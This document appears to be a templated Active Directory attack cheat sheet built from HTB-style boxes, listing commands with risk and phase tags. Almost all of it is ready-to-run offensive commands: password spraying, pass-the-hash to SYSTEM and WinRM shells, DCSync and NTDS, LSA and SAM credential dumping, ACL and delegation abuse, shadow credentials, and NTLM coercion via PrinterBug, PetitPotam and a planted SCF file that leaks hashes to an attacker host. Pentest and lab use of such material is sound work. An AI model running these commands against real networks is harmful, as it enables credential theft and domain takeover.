# Active Directory Attacks

> AD enumeration, abuse paths, ACL attacks, lateral, dump — drawn from real HTB/box patterns

<!-- tags: ad, active-directory, windows, kerberos, smb, ldap, exploit -->

---

## enum smb shares anonymous
Enumerate shares with null/guest session.

```bash
smbmap -H {{TARGET:ip}} -u Guest -p ""
```

<!-- meta: risk=safe | phase=enum | tags=ad,smb,anon -->

---

## enum smb shares authenticated
Enumerate shares with creds.

```bash
smbmap -H {{TARGET:ip}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}}
```

<!-- meta: risk=safe | phase=enum | tags=ad,smb,auth -->

---

## download smb share recursive
Pull all files from a writable share.

```bash
smbclient //{{TARGET:ip}}/{{SHARE:str:Backups}} -U "{{USERNAME:str:guest}}%{{PASSWORD:str:}}" -c "prompt OFF; recurse ON; mget *"
```

<!-- meta: risk=safe | phase=enum | tags=ad,smb,download -->

---

## mount smb share cifs
Mount SMB share as filesystem for fast browsing.

```bash
sudo mount -t cifs //{{TARGET:ip}}/{{SHARE:str:Backups}} /mnt -o user={{USERNAME:str:guest}},password={{PASSWORD:str:}}
```

<!-- meta: risk=safe | phase=enum | tags=ad,smb,mount -->

---

## enum users RID brute smb
Pull users via RID brute against SMB.

```bash
nxc smb {{TARGET:ip}} -u "{{USERNAME:str:guest}}" -p "" --rid-brute
```

<!-- meta: risk=safe | phase=enum | tags=ad,user,rid -->

---

## enum domain info smb
Quick domain fingerprint.

```bash
nxc smb {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=recon | tags=ad,smb,fingerprint -->

---

## spray passwords smb
Spray one password across many users.

```bash
nxc smb {{TARGET:ip}} -u {{USERLIST:wordlist:users.txt}} -p '{{PASSWORD:str:Welcome1}}' --continue-on-success
```

<!-- meta: risk=med | phase=passwords | tags=ad,spray,smb -->

---

## spray passwords kerberos
Spray over Kerberos to avoid SMB lockouts.

```bash
nxc smb {{TARGET:ip}} -u {{USERLIST:wordlist:users.txt}} -p '{{PASSWORD:str:Welcome1}}' -k --continue-on-success
```

<!-- meta: risk=med | phase=passwords | tags=ad,spray,kerberos -->

---

## test ldap bind creds
Confirm LDAP creds.

```bash
ldapsearch -x -H ldap://{{TARGET:ip}} -D "{{USERNAME:str:user}}@{{DOMAIN:domain:corp.local}}" -w "{{PASSWORD:str:pass}}" -b "dc={{DC1:str:corp}},dc={{DC2:str:local}}" "(objectClass=user)" sAMAccountName
```

<!-- meta: risk=safe | phase=enum | tags=ad,ldap -->

---

## dump ldap anonymous
Pull objects without creds when allowed.

```bash
ldapsearch -x -H ldap://{{TARGET:ip}} -b "dc={{DC1:str:corp}},dc={{DC2:str:local}}" "(objectClass=*)"
```

<!-- meta: risk=safe | phase=enum | tags=ad,ldap,anon -->

---

## collect bloodhound linux
Collect graph data with bloodhound-python.

```bash
bloodhound-python -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}} -ns {{TARGET:ip}} -c All --zip
```

<!-- meta: risk=safe | phase=enum | tags=ad,bloodhound -->

---

## collect bloodhound kerberos ticket
Collect using ccache instead of password.

```bash
KRB5CCNAME=user.ccache bloodhound-python -u "{{USERNAME:str:user}}" -k -d {{DOMAIN:domain:corp.local}} -dc {{DC_HOST:str:dc01.corp.local}} -ns {{TARGET:ip}} -c All
```

<!-- meta: risk=safe | phase=enum | tags=ad,bloodhound,kerberos -->

---

## pass-the-hash smb
Authenticate with NT hash via SMB.

```bash
nxc smb {{TARGET:ip}} -u {{USERNAME:str:Administrator}} -H {{NTHASH:str:31d6cfe0d16ae931b73c59d7e0c089c0}}
```

<!-- meta: risk=high | phase=exploit | tags=ad,pth,smb -->

---

## pass-the-hash winrm shell
Get a shell via WinRM with hash.

```bash
evil-winrm -i {{TARGET:ip}} -u "{{USERNAME:str:Administrator}}" -H "{{NTHASH:str:31d6cfe0d16ae931b73c59d7e0c089c0}}"
```

<!-- meta: risk=high | phase=exploit | tags=ad,pth,winrm -->

---

## pass-the-hash psexec SYSTEM
Drop SYSTEM shell with hash.

```bash
impacket-psexec -hashes :{{NTHASH:str:31d6cfe0d16ae931b73c59d7e0c089c0}} {{USERNAME:str:Administrator}}@{{TARGET:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=ad,impacket,psexec,pth -->

---

## dump SAM offline hives
Dump SAM from offline registry hives.

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

<!-- meta: risk=high | phase=post | tags=ad,secretsdump,offline -->

---

## dcsync dump ntlm hashes
Pull all NTLM hashes from DC (requires DCSync rights).

```bash
impacket-secretsdump -just-dc-ntlm {{DOMAIN:domain:corp.local}}/{{USERNAME:str:Administrator}}:{{PASSWORD:str:pass}}@{{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=critical | phase=post | tags=ad,dcsync,secretsdump -->

---

## dcsync kerberos ticket
DCSync using cached TGT.

```bash
impacket-secretsdump -k -no-pass -just-dc {{DC_HOST:str:dc01.corp.local}}
```

<!-- meta: risk=critical | phase=post | tags=ad,dcsync,kerberos -->

---

## find dcsync rights powerview
Locate principals with DS-Replication-Get-Changes.

```bash
echo 'Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | ?{ $_.ObjectAceType -match "DS-Replication" }'
```

<!-- meta: risk=safe | phase=enum | tags=ad,dcsync,powerview -->

---

## reset user password bloodyad
Force-set a target user password (needs reset rights).

```bash
bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}} --host {{DC_HOST:str:dc01.corp.local}} set password "{{TARGET_USER:str:victim}}" "{{TARGET_PASSWORD:str}}"
```

<!-- meta: risk=high | phase=exploit | tags=ad,bloodyad,password -->

---

## add shadow credentials bloodyad
Add msDS-KeyCredentialLink for PKINIT abuse.

```bash
bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}} --host {{DC_HOST:str:dc01.corp.local}} add shadowCredentials {{TARGET_USER:str:victim}}
```

<!-- meta: risk=high | phase=exploit | tags=ad,shadowcreds,bloodyad -->

---

## add genericall over OU
Grant GenericAll over an OU to a principal.

```bash
bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domain:corp.local}} --host {{DC_HOST:str:dc01.corp.local}} add genericAll "OU={{OU_NAME:str:Servers}},DC=corp,DC=local" "{{TARGET_USER:str}}"
```

<!-- meta: risk=high | phase=exploit | tags=ad,acl,bloodyad -->

---

## write DACL fullcontrol
Write FullControl on target object.

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal '{{ATTACKER:str:user}}' -target '{{TARGET_USER:str}}' '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}'
```

<!-- meta: risk=high | phase=exploit | tags=ad,acl,dacledit -->

---

## pkinit cert to TGT
Abuse cert + key for TGT.

```bash
python3 PKINITtools/gettgtpkinit.py -cert-pem {{CERT:file:user_cert.pem}} -key-pem {{KEY:file:user_priv.pem}} {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}} {{USERNAME:str:user}}.ccache
```

<!-- meta: risk=high | phase=exploit | tags=ad,pkinit,certs -->

---

## add computer account ldap
Add a fake computer object (MachineAccountQuota=10).

```bash
impacket-addcomputer "{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}" -computer-name '{{NEW_COMP:str:fake01}}$' -computer-pass '{{COMP_PASS:str:Password123!}}' -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=high | phase=exploit | tags=ad,computer,maq -->

---

## rbcd resource-based delegation
Set msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD attack.

```bash
impacket-rbcd -delegate-from '{{NEW_COMP:str:fake01}}$' -delegate-to '{{TARGET_COMP:str:WEB01}}$' -action 'write' '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}'
```

<!-- meta: risk=critical | phase=exploit | tags=ad,rbcd,delegation -->

---

## coerce netntlm scf drop
Drop .scf to coerce hash from anyone browsing share.

```bash
printf "[Shell]\nCommand=2\nIconFile=\\\\\\\\{{LHOST:ip}}\\\\share\\\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n" > @file.scf
```

<!-- meta: risk=med | phase=exploit | tags=ad,scf,coerce,ntlmrelay -->

---

## coerce auth printerbug
Trigger SpoolService to authenticate to attacker.

```bash
python3 printerbug.py {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}@{{TARGET:ip}} {{LHOST:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=ad,coerce,printerbug -->

---

## coerce DC auth petitpotam
Coerce DC to authenticate via EFSRPC.

```bash
python3 PetitPotam.py {{LHOST:ip}} {{TARGET:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=ad,coerce,petitpotam -->

---

## loot sccm mecm creds
Hunt for SCCM/MECM creds via NetExec module.

```bash
nxc smb {{TARGET:ip}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -M sccm
```

<!-- meta: risk=safe | phase=enum | tags=ad,sccm,nxc -->

---

## dump lsa secrets
Dump cached creds from a host.

```bash
nxc smb {{TARGET:ip}} -u "{{USERNAME:str:Administrator}}" -p "{{PASSWORD:str:pass}}" --lsa
```

<!-- meta: risk=high | phase=post | tags=ad,lsa,credentials -->

---

## dump ntds smb
Dump NTDS over SMB if local admin.

```bash
nxc smb {{TARGET:ip}} -u "{{USERNAME:str:Administrator}}" -p "{{PASSWORD:str:pass}}" --ntds
```

<!-- meta: risk=critical | phase=post | tags=ad,ntds -->

---

## read laps passwords ldap
Pull cleartext LAPS passwords if reader.

```bash
nxc ldap {{TARGET:ip}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -M laps
```

<!-- meta: risk=med | phase=post | tags=ad,laps -->

---

## decrypt gpp password sysvol
Find + decrypt cpassword from SYSVOL Group Policy Preferences.

```bash
nxc smb {{DC_IP:ip:10.10.10.1}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -M gpp_password
```

<!-- meta: risk=high | phase=post | tags=ad,gpp,sysvol -->

---

## find kerberoastable SPN accounts
Pull SPN-bearing accounts.

```bash
impacket-GetUserSPNs {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}} -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=safe | phase=enum | tags=ad,kerberoast,spn -->

---

## change computer account password
Set new computer-account password / NT hash.

```bash
KRB5CCNAME={{COMP:str:web01}}.ccache impacket-changepasswd -newhashes :{{TARGET_NTHASH:str}} '{{DOMAIN:domain:corp.local}}/{{COMP:str:web01}}$:{{OLD_PASS:str:OldPass}}@{{DC_HOST:str:dc.corp.local}}' -k
```

<!-- meta: risk=high | phase=exploit | tags=ad,computer,password -->
